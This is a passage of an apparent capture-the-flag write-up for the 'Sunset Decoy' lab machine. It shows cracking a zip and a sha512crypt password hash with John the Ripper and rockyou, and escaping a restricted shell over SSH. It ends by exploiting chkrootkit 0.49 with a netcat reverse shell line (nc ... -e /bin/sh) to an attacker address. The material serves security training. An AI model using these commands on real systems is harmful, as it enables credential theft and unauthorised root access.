+1g<span class="w"> </span><span class="m">0</span>:00:00:00<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2023</span>-08-18<span class="w"> </span><span class="m">17</span>:00<span class="o">)</span><span class="w"> </span><span class="m">100</span>.0g/s<span class="w"> </span>6553Kp/s<span class="w"> </span>6553Kc/s<span class="w"> </span>6553KC/s<span class="w"> </span><span class="m">123456</span>..sabrina7
+Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span>option<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
+Session<span class="w"> </span>completed.
+</pre></div>
+</div>
+<p>Unzipping the archive</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>unzip<span class="w"> </span>save.zip
+Archive:<span class="w">  </span>save.zip
+<span class="o">[</span>save.zip<span class="o">]</span><span class="w"> </span>etc/passwd<span class="w"> </span>password:
+<span class="w">  </span>inflating:<span class="w"> </span>etc/passwd
+<span class="w">  </span>inflating:<span class="w"> </span>etc/shadow
+<span class="w">  </span>inflating:<span class="w"> </span>etc/group
+<span class="w">  </span>inflating:<span class="w"> </span>etc/sudoers
+<span class="w">  </span>inflating:<span class="w"> </span>etc/hosts
+<span class="w"> </span>extracting:<span class="w"> </span>etc/hostname
+</pre></div>
+</div>
+<p>And looking around in the files</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>hosts
+<span class="m">127</span>.0.0.1<span class="w">       </span>localhost
+<span class="m">127</span>.0.1.1<span class="w">       </span>decoy
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+::1<span class="w">     </span>localhost<span class="w"> </span>ip6-localhost<span class="w"> </span>ip6-loopback
+ff02::1<span class="w"> </span>ip6-allnodes
+ff02::2<span class="w"> </span>ip6-allrouters
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>hostname
+60832e9f188106ec5bcc4eb7709ce592
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root:x:0:0:root:/root:/bin/bash
+296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
+</pre></div>
+</div>
+</section>
+<section id="hash-cracking">
+<h2>Hash Cracking<a class="headerlink" href="#hash-cracking" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^#\|^$&#39;</span><span class="w"> </span>sudoers
+Defaults<span class="w">        </span>env_reset
+Defaults<span class="w">        </span>mail_badpass
+Defaults<span class="w">        </span><span class="nv">secure_path</span><span class="o">=</span><span class="s2">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>
+root<span class="w">    </span><span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span><span class="w"> </span>ALL
+%sudo<span class="w">   </span><span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span><span class="w"> </span>ALL
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tail<span class="w"> </span>-1<span class="w"> </span>shadow
+296640a3b825115a47b68fc44501c828:<span class="nv">$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us</span>.:18450:0:99999:7:::
+</pre></div>
+</div>
+<p>Be the bcrypt hashes for root and for another user, the later can be cracked, again because that’s a very simple password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>hash.txt
+<span class="nv">$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us</span>.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hash.txt
+Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
+Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>sha512crypt,<span class="w"> </span>crypt<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w"> </span><span class="nv">$6</span>$<span class="w"> </span><span class="o">[</span>SHA512<span class="w"> </span><span class="m">128</span>/128<span class="w"> </span>ASIMD<span class="w"> </span>2x<span class="o">])</span>
+Cost<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>iteration<span class="w"> </span>count<span class="o">)</span><span class="w"> </span>is<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
+Will<span class="w"> </span>run<span class="w"> </span><span class="m">4</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
+Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
+server<span class="w">           </span><span class="o">(</span>?<span class="o">)</span>
+1g<span class="w"> </span><span class="m">0</span>:00:00:04<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2023</span>-08-18<span class="w"> </span><span class="m">17</span>:07<span class="o">)</span><span class="w"> </span><span class="m">0</span>.2028g/s<span class="w"> </span>3531p/s<span class="w"> </span>3531c/s<span class="w"> </span>3531C/s<span class="w"> </span>felton..petey
+Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span>option<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
+Session<span class="w"> </span>completed.
+</pre></div>
+</div>
+</section>
+<section id="escaping-rbash">
+<h2>Escaping rbash<a class="headerlink" href="#escaping-rbash" title="Permalink to this heading">#</a></h2>
+<p>When sshing with that password we get in a restricted shell, which apparently can simply be escaped by running <code class="docutils literal notranslate"><span class="pre">-t</span> <span class="pre">&quot;bash</span> <span class="pre">--noprofile&quot;</span></code></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ssh 296640a3b825115a47b68fc44501c828@192.168.185.85 -t &quot;bash --noprofile&quot;
+296640a3b825115a47b68fc44501c828@192.168.185.85&#39;s password:
+bash: dircolors: command not found
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd ../
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/home$
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/bin/cat<span class="w"> </span>local.txt
+<span class="m">3</span>*******************************
+</pre></div>
+</div>
+<p>there’s that honeypot binary in the user home dir, after taking a quick look in ghidra, it does a bunch of different things, runs cal, run date, runs vim which could have been interesting if we had a way to run is as root, but we don’t, it also has an option that touches a files in /tmp and says that an anti virus is gonna be ran soon. So we touch the file and setup pspy64 to look at what exactly happens:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:55:42<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">30431</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>./honeypot.decoy
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:55:42<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">30432</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span>/usr/bin/touch<span class="w"> </span>/dev/shm/STTY5246
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30433</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/sbin/CRON<span class="w"> </span>-f
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30434</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/sbin/CRON<span class="w"> </span>-f
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30435</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span>/bin/bash<span class="w"> </span>/root/script.sh
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30436</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>/root/script.sh
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30439</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>/root/chkrootkit-0.49/chkrootkit
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30438</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>/root/chkrootkit-0.49/chkrootkit
+<span class="m">2023</span>/08/18<span class="w"> </span><span class="m">12</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">30437</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>/root/chkrootkit-0.49/chkrootkit
+</pre></div>
+</div>
+</section>
+<section id="chrootkit-0-49-exploit">
+<h2>Chrootkit 0.49 exploit<a class="headerlink" href="#chrootkit-0-49-exploit" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a></p>
+<p>From there, things a pretty straightforward</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/bin/cat<span class="w"> </span>/tmp/update
+/bin/nc<span class="w"> </span><span class="m">192</span>.168.45.227<span class="w"> </span><span class="m">4242</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../../dvwa/dvwa.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">DVWA</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../ha_natraj/ha_natraj.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Ha Natraj</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Sunset Decoy</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#hash-cracking">Hash Cracking</a></li>
+<li><a class="reference internal" href="#escaping-rbash">Escaping rbash</a></li>
+<li><a class="reference internal" href="#chrootkit-0-49-exploit">Chrootkit 0.49 exploit</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
